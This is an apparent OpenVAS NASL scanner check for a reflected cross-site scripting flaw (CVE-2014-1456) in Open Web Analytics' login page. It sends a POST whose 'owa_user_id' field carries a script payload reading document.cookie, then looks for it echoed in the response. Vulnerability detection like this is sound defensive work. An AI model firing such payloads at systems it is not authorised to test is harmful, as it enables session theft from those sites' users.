CPE = "cpe:/a:openwebanalytics:open_web_analytics";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804404" );
	script_version( "$Revision: 11867 $" );
	script_cve_id( "CVE-2014-1456" );
	script_bugtraq_id( 65571 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $" );
	script_tag( name: "creation_date", value: "2014-03-05 13:12:41 +0530 (Wed, 05 Mar 2014)" );
	script_name( "Open Web Analytics Reflected Cross-Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with Open Web Analytics and is prone to cross-site
  scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Get the installed location with the help of detect NVT and check xss is
  possible." );
	script_tag( name: "insight", value: "Input passed via the 'owa_user_id' parameter to the login page is not properly
  sanitised before being returned to the user." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in context of an affected site." );
	script_tag( name: "affected", value: "Open Web Analytics version 1.5.5 and prior." );
	script_tag( name: "solution", value: "Upgrade to Open Web Analytics 1.5.6 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/56885" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/91124" );
	script_xref( name: "URL", value: "http://www.secureworks.com/cyber-threat-intelligence/advisories/SWRX-2014-004" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_open_web_analytics_detect.sc" );
	script_mandatory_keys( "OpenWebAnalytics/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "http://downloads.openwebanalytics.com" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
owaPort = get_app_port( cpe: CPE );
if(!owaPort){
	exit( 0 );
}
host = http_host_name( port: owaPort );
if(!dir = get_app_location( cpe: CPE, port: owaPort )){
	exit( 0 );
}
postdata = "owa_user_id=%22%3E%3Cscript%3Ealert%28document.cookie%29%3B" + "%3C%2Fscript%3E&owa_password=&owa_go=&owa_action=base.login" + "&owa_submit_btn=Login";
owaReq = NASLString( "POST ", dir, "/index.php HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n\\r\\n", postdata );
owaRes = http_keepalive_send_recv( port: owaPort, data: owaReq );
if(IsMatchRegexp( owaRes, "^HTTP/1\\.[01] 200" ) && ContainsString( owaRes, "\">alert(document.cookie);\">" ) && ContainsString( owaRes, ">Web Analytics<" )){
	security_message( owaPort );
	exit( 0 );
}

